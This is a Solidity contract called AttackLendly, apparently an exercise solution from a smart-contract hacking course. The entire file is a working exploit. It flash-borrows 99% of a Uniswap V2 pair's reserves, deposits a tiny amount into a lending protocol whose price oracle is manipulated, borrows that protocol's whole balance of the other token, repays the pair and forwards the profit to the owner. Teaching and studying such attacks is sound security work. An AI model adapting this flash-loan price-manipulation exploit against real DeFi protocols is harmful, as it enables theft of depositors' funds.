// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity 0.8.13;

import {IUniswapV2Pair} from "../../interfaces/IUniswapV2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface ILendly {
    function deposit(address _token, uint256 _amount) external;
    function borrow(address _token, uint256 _amount) external;
}

/**
 * @title AttackLendly
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackLendly is Ownable {

    ILendly immutable private lendly;
    IUniswapV2Pair immutable private pair;
    IERC20 immutable private token0;
    IERC20 immutable private token1;
    uint256 private reserve0;
    uint256 private reserve1;

    constructor(address _pair, address _lendly) {
        pair = IUniswapV2Pair(_pair);
        lendly = ILendly(_lendly);
        token0 = IERC20(IUniswapV2Pair(pair).token0());
        token1 = IERC20(IUniswapV2Pair(pair).token1());
    }

    function attack() external onlyOwner {

        uint256 wantedLoan;
        bytes memory data;

        // Get the reserves of the Pair smart contract
        (reserve0, reserve1,) = pair.getReserves();
        // Flash loan 99% DAI liquidity, drain all Lendly ETH
        wantedLoan = reserve0 * 99 / 100;
        data = abi.encode(token0);
        pair.swap(wantedLoan, 0, address(this), data);


        // Get the reserves of the Pair smart contract
        // Flash loan 99% WETH liquidity, drain all Lendly DAI
        (reserve0, reserve1,) = pair.getReserves();
        wantedLoan = reserve1 * 99 / 100;
        data = abi.encode(token1);
        pair.swap(0, wantedLoan, address(this), data);

    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {

        // Make sure it's a legit callback
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        // Extract the token from the data and revert if it's a wrong token
        IERC20 token = IERC20(abi.decode(data, (address)));
        require(token == token0 || token == token1, "wrong token");

        uint256 amount = amount0 == 0 ? amount1 : amount0;

        // Deposit 0.1% of the amount
        uint256 depositAmount = amount * 1 / 1000;
        token.approve(address(lendly), depositAmount);
        lendly.deposit(address(token), depositAmount);

        // Determine other token address
        IERC20 otherToken;
        uint256 otherTokenReserve;
        if(token == token0) {
            otherToken = token1;
            otherTokenReserve = reserve1;
        } else {
            otherToken = token0;
            otherTokenReserve = reserve0;
        }

        // Borrow all the other token
        lendly.borrow(address(otherToken), otherToken.balanceOf(address(lendly)));

        // Pay back only 99.9%
        uint256 tokenPaymentAmount = amount * 999 / 1000;

        // Amount to pay in the other token OtherToken Reserve * 4 / 1000
        uint256 otherTokenPaymentAmount = otherTokenReserve * 4 / 1000;

        token.transfer(address(pair), tokenPaymentAmount);
        otherToken.transfer(address(pair), otherTokenPaymentAmount);
        
        withdrawProfit();
    }

    function withdrawProfit() internal {
        token0.transfer(owner(), token0.balanceOf(address(this)));
        token1.transfer(owner(), token1.balanceOf(address(this)));
    }

}